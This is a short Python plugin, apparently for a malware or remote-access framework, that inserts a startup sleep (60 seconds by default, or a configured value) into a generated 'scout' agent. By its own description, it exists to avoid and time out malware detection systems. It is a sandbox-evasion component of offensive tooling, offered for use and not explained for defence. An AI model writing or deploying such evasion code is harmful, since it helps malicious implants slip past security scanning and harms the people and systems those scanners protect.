# API
# done


def main(self, option, extra_input=None):
    if option == 'generate':
        self.config.import_statements.append('from time import sleep')
        conditions = extra_input
        if 'scout_sleep_time' in conditions.keys():
            sleep_duration = conditions['scout_sleep_time']
            self.log.pos("Sleep duration set to " + str(sleep_duration) + "s")
            self.config.startup_start.append('sleep(' + str(sleep_duration) + ')')
        else:
            self.log.pos("Sleep duration set to 60s")
            self.config.startup_start.append('sleep(60)')
    elif option == 'info':
        self.log.blank('\nName             : Sleep startup component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : time' \
                       '\nCommands         : NIL (Runs at startup)' \
                       '\nDescription      : Sleeps the scout before running any other processes to avoid and timeout malware detection systems\n')
        return {
            "Name": "Sleep startup component",
            "OS": "Linux",
            "Required Modules": "time",
            "Commands": "NIL (Runs at startup)",
            "Description": "Sleeps the scout before running any other processes to avoid and timeout malware detection systems"
        }